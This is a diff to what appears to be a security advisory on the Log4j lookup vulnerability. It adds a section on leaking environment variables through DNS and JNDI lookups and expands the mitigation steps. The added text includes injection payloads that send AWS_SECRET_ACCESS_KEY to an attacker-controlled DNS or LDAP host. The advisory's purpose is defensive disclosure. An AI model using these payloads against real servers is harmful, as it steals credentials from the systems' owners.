@@ -180,9 +180,13 @@ Environment Lookup dumps environment variables in logs. For example ```${env:USE
 
 This can disclose sensitive secrets in plaintext to anyone who has access to those logs. If the logger is used with an appender that discloses information back to the attacker, then the attacker can openly read the values of all environment variables.
 
-### Information Leakage using DNS Lookup
+### Information Leakage using DNS or JNDI Lookup
 
+Even if an attacker cannot get access to log files, where environment variables have been dumped, there are other ways to leak those values. Two simple ways to do that are JNDI or DNS lookup calls.
 
+Using a payload such as ```${jndi:dns://attacker-controlled-dns.com/a-domain}``` will cause the vulnerable web server to send a DNS query to ```attacker-controlled-dns.com```, asking for the ```a-domain``` DNS record. If the attacker changes the payload to ```${jndi:dns://attacker-controlled-dns.com/${env:AWS_SECRET_ACCESS_KEY}}```, then a DNS query is sent to the attacker controlled DNS server, with the value of the ```$AWS_SECRET_ACCESS_KEY``` environment variable as the domain whose record is being asked for. The attacker can simply extract the value from the query and misuse it.
+
+On similar notes, even if an attacker is unable to pull off a complete RCE through JNDI injection, a payload like ```{jndi:ldap://directory.attacker-controlled-domain.com/${env:AWS_SECRET_ACCESS_KEY}}``` will leak the sensitive environment variable's value to the attacker, in the same way as explained above.
 
 
 # Remediation
@@ -190,6 +194,11 @@ This can disclose sensitive secrets in plaintext to anyone who has access to tho
 **Recommended**: Upgrade Log4j to a version ```2.15.0``` or above.
 
 If not possible, the following workarounds will also mitigate:
-* Modify every logging pattern to say ```%m{nolookups}``` instead of ```%m``` in logging config files, see details at [Log4j JIRA](https://issues.apache.org/jira/browse/LOG4J2-2109) (only works on versions >= 2.7). Make sure to introduce explicit pattern for all appenders as default pattern won't have this mitigation.
-* Substitute a non-vulnerable or no-operation implementation of the class ```org.apache.logging.log4j.core.lookup.JndiLookup```, in a way that the classloader uses this replacement instead of the vulnerable version of the class.
-* In Log4j versions >= 2.10, it's possible to mitigate this issue by setting JVM system property ```-Dlog4j2.formatMsgNoLookups=true``` or the environment variable ```LOG4J_FORMAT_MSG_NO_LOOKUPS``` to true
+* Modify every logging pattern to say ```%m{nolookups}``` instead of ```%m``` in logging config files, see details at [Log4j JIRA](https://issues.apache.org/jira/browse/LOG4J2-2109) (only works on versions &ge; 2.7). Make sure to introduce explicit pattern for all appenders as default pattern won't have this mitigation.
+* Substitute a non-vulnerable or no-operation implementation of the following lookup classes in a way that the classloader uses this replacement instead of the vulnerable version of the class.:
+  * ```org.apache.logging.log4j.core.lookup.JndiLookup```
+  * ```org.apache.logging.log4j.core.lookup.EnvironmentLookup```
+* The vulnerable lookup classes can be removed from all ```log4j-core-*.jar``` (or any fat JAR) files as follows. Change the ```find``` pattern accordingly:
+  * ```find . -name "*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/lookup/JndiLookup.class \;```
+  * ```find . -name "*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/lookup/EnvironmentLookup.class \;```
+* In Log4j versions &ge; 2.10, it's possible to mitigate this issue by setting JVM system property ```-Dlog4j2.formatMsgNoLookups=true``` or the environment variable ```LOG4J_FORMAT_MSG_NO_LOOKUPS``` to true
